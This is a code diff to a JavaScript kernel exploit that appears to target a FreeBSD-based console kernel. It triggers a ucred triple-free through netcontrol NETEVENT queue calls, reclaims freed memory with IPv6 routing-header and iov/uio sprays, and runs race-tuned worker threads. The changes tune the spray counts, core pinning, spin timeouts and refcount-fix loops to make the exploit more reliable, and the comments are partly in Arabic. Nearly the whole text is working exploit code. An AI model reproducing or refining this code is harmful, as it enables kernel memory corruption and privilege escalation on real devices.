@@ -105,7 +105,7 @@ var CPU_LEVEL_WHICH = 3;
 var CPU_WHICH_TID = 1;
 var IOV_SIZE = 0x10;
 var CPU_SET_SIZE = 0x10;
-var PIPEBUF_SIZE = 0x20;
+var PIPEBUF_SIZE = 0x18;
 var MSG_HDR_SIZE = 0x30;
 var FILEDESCENT_SIZE = 0x8;
 var UCRED_SIZE = 0x168;
@@ -114,14 +114,14 @@ var UIO_IOV_NUM = 0x14; // 20
 var MSG_IOV_NUM = 0x17; // 23
 
 // Params for kext stability
-var IPV6_SOCK_NUM = 64;
+var IPV6_SOCK_NUM = 150;
 var IOV_THREAD_NUM = 4;
 var UIO_THREAD_NUM = 4;
 var MAIN_LOOP_ITERATIONS = 3;
 var TRIPLEFREE_ITERATIONS = 4;
 var MAX_ROUNDS_TWIN = 10;
 var MAX_ROUNDS_TRIPLET = 120;
-var MAIN_CORE = 4;
+var MAIN_CORE = 5;
 var MAIN_RTPRIO = 0x100;
 var RTP_LOOKUP = 0;
 var RTP_SET = 1;
@@ -477,9 +477,9 @@ function wait_for(addr, threshold) {
     threshold = new BigInt(0x0, threshold);
   }
   var spins = 0;
-  var MAX_SPINS = 50000;
+  var MAX_SPINS = 70000;
   while (!read64(addr).eq(threshold)) {
-    nanosleep_fun(2);
+    nanosleep_fun(1);
     spins++;
     if (spins >= MAX_SPINS) {
       log('wait_for: timeout waiting for ' + hex(addr));
@@ -1268,40 +1268,92 @@ function remove_uaf_file() {
   }
 }
 // ثوابت بدل الأرقام السحرية
-var TRIPLEFREE_REFCOUNT_FIX_LOOPS = 16;
+var TRIPLEFREE_REFCOUNT_FIX_LOOPS = 32;
 var TRIPLEFREE_REFCOUNT_MAX_WAIT = 2000;
 function trigger_ucred_triplefree() {
   var end = false;
+  // Prepare spray buffer.
+  spray_rthdr_len = build_rthdr(spray_rthdr, UCRED_SIZE);
 
-  // msgIov كما في الأصلي
-  write64(msgIov.add(0x0), 1);
-  write64(msgIov.add(0x8), 1);
+  // Prepare msg iov buffer.
+  write64(msg.add(0x10), msgIov);        // msg_iov
+  write64(msg.add(0x18), MSG_IOV_NUM);   // msg_iovlen
+
+  // Dummy buffer for uio iov.
+  var dummyBuffer = malloc(0x1000);
+  memset(dummyBuffer, 0x41, 0x1000);
+
+  // Set iov_base for uio read/write.
+  write64(uioIovRead,  dummyBuffer);
+  write64(uioIovWrite, dummyBuffer);
+
+  // Create socket pair for uio spraying.
+  var uio_pair = socketpair(AF_UNIX, SOCK_STREAM, 0);
+  uio_sock_0 = uio_pair[0];
+  uio_sock_1 = uio_pair[1];
+
+  // Create socket pair for iov spraying.
+  var iov_pair = socketpair(AF_UNIX, SOCK_STREAM, 0);
+  iov_sock_0 = iov_pair[0];
+  iov_sock_1 = iov_pair[1];
+
+  for (var i = 0; i < IOV_THREAD_NUM; i++) {
+    var worker = create_iov_worker(iovState);
+    iov_recvmsg_workers[i] = worker;
+    worker.ready_flag = true;
+  }
+
+  for (var i = 0; i < UIO_THREAD_NUM; i++) {
+    var worker = create_uio_worker(uioState);
+    uio_readv_workers[i] = worker;
+    worker.ready_flag = true;
+  }
+
+  // Set up sockets for spraying.
+  for (var i = 0; i < ipv6_socks.length; i++) {
+    ipv6_socks[i] = socket(AF_INET6, SOCK_STREAM, 0);
+  }
+
+  // Initialize pktopts.
+  for (var i = 0; i < ipv6_socks.length; i++) {
+    free_rthdr(ipv6_socks[i]);
+  }
+
+  var setBuf = malloc(8);
+  var clearBuf = malloc(8);
+
+  write64(msgIov.add(0x00), 1n);     // iov_base
+  write64(msgIov.add(0x08), 1n);     // iov_len (Int8.SIZE = 1)
+
   var main_count = 0;
   while (!end && main_count < TRIPLEFREE_ITERATIONS) {
     main_count++;
 
     // 1) dummy socket → register in netcontrol
     var dummy_socket = socket(AF_UNIX, SOCK_STREAM, 0);
-    write32(nc_set_buf, Number(dummy_socket.and(0xFFFFFFFF)));
-    netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_SET_QUEUE, nc_set_buf, 8);
+
+    write32(setBuf, Number(dummy_socket));
+
+    netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_SET_QUEUE, setBuf, 8);
+
     close(new BigInt(dummy_socket));
 
     // 2) allocate new ucred
     setuid(1);
 
-    // 3) reclaim fd → uaf_socket
-    uaf_socket = Number(socket(AF_UNIX, SOCK_STREAM, 0));
-
-    // 4) free previous ucred
+    // Reclaim the file descriptor.
+    var uaf_socket = socket(AF_UNIX, SOCK_STREAM, 0);
+          
+    // Free the previous ucred. Now uaf_socket's cr_refcnt of f_cred is 1.
     setuid(1);
 
-    // 5) unregister → free file + ucred
-    write32(nc_clear_buf, uaf_socket);
-    netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_CLEAR_QUEUE, nc_clear_buf, 8);
+    write32(clearBuf, uaf_socket);
+    netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_CLEAR_QUEUE, clearBuf, 8);
 
     // 6) محاولة إصلاح refcount بشكل خفيف
     for (var i = 0; i < TRIPLEFREE_REFCOUNT_FIX_LOOPS; i++) {
       trigger_iov_recvmsg();
+      sched_yield();
       write(new BigInt(iov_sock_1), tmp, 1);
       wait_iov_recvmsg();
       read(new BigInt(iov_sock_0), tmp, 1);
@@ -1326,6 +1378,7 @@ function trigger_ucred_triplefree() {
     while (count < TRIPLEFREE_REFCOUNT_MAX_WAIT) {
       // شغّل recvmsg
       trigger_iov_recvmsg();
+      sched_yield();
 
       // كمّل دورة iov بالكامل
       write(new BigInt(iov_sock_1), tmp, 1);
